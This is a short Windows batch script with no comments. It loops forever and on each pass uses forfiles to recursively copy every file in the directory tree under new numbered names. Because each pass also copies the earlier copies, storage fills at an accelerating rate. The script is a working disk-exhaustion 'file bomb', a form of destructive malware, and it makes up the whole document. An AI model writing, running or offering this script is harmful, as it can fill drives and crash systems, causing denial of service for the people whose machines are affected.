@echo off
set COUNTER=0
:1
set /a COUNTER=%COUNTER%+1
forfiles /s /c "cmd /c copy /Y @file @file%COUNTER%"
goto 1